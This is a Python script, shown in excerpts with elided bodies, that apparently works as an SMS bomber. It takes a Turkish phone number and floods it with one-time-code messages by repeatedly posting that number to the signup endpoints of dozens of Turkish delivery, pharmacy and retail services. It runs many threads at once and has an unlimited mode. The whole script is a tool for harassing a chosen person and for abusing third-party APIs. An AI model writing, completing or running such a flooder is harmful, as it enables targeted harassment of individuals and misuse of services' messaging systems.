...
try:
    ...
    print("Gerekli mod眉ller indiriliyor...")
...
def istegelsin(number):
    try:
        ...
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "陌steGelsin"
        else:
            return False, "陌steGelsin"
    except:
        return False, "陌steGelsin"
...
def ikinciyeni(number):
    try:
        ...
        if r1 == True:
            return True, "陌kinci Yeni"
        else:
            return False, "陌kinci Yeni"
    except:
        return False, "陌kinci Yeni"
...
def ceptesok(number):
    try:
        ...
        if r.status_code == 200:
            return True, "Cepte 艦ok"
        else:
            return False, "Cepte 艦ok"
    except:
        return False, "Cepte 艦ok"
...
def tiklagelsin(number):
    try:
        ...
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "T谋kla Gelsin"
        else:
            return False, "T谋kla Gelsin"
    except:
        return False, "T谋kla Gelsin"
...
def kalmasin(number):
    try:
        ...
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Kalmas谋n"
        else:
            return False, "Kalmas谋n"
    except:
        return False, "Kalmas谋n"
...
def hizliecza(number):
    try:
        ...
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            return True, "H谋zl谋 Ecza"
        else:
            return False, "H谋zl谋 Ecza"
    except:
        return False, "H谋zl谋 Ecza"
...
def goyakit(number):
    try:
        ...
        if r1 == True:
            return True, "Go Yak谋t"
        else:
            return False, "Go Yak谋t"
    except:
        return False, "Go Yak谋t"
...
def send(number, amount, worker_amount):
    ...
    clear()
    print(f"{number} numaras谋na SMS g枚nderimi ba艧lat谋ld谋!\n")
    if amount == 0:
        ...
        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
            for i in range(amount):
                executor.submit(send_service, number, functions[i % 49])
    print("\nG枚nderim tamamland谋!")
    print(f"{all_sends} SMS, {int(time.perf_counter()) - start_time} saniye i莽erisinde g枚nderildi. {success_sends} ba艧ar谋l谋, {failed_sends} ba艧ar谋s谋z.\n")
    all_sends = 0
    success_sends = 0
    failed_sends = 0
    restart()
...
output = render('EMRE', colors=['white', 'yellow'], align='center')
print(output)
...
def get_number():
    ...
    while True:
        try:
            number = int(input(f"""Telefon numaras谋n谋 yazin. Bunun gibi: "54xxxxxxxx" (Sadece Turkiye numaralarinda calisir!)\n[?]
           : """))
            if len(str(number)) == 10 and str(number)[0] == "5":
                return number
            else:
                clear()
                print(f"Yanlis numara bicimi girildi.")
        except:
            clear()
            print(f"Lutfen bir numara yazin.")

def get_amount():
    global clear
    while True:
        try:
            amount = int(input(f"""Kac SMS gonderilsin? Sinirsiz gonderim icin "0" basin.\n[?] : """))
            if amount >= 0:
                return amount
            else:
                clear()
                print(f"Girilen sayi 0'dan kucuk olamaz.")
        except:
            clear()
            print(f"Lutfen bir sayi girin.")

def get_worker_amount():
    global clear
    while True:
        try:
            worker_amount = int(input(f"Thread sayisini girin. Tavsiye edilen 5-100 arasidir.\n[?] : "))
            if worker_amount >= 1:
                return worker_amount
            else:
                clear()
                print(f"Girilen sayi 1'den kucuk olamaz.")
        except:
            clear()
            print(f"Lutfen bir sayi girin.")
...
def restart():
    global clear
    while True:
        question = input(f"Programdan cikilsin mi?\n[Y/N] : ").upper().replace(" ", "")
        if question == "Y":
            quit()
        elif question == "N":
            clear()
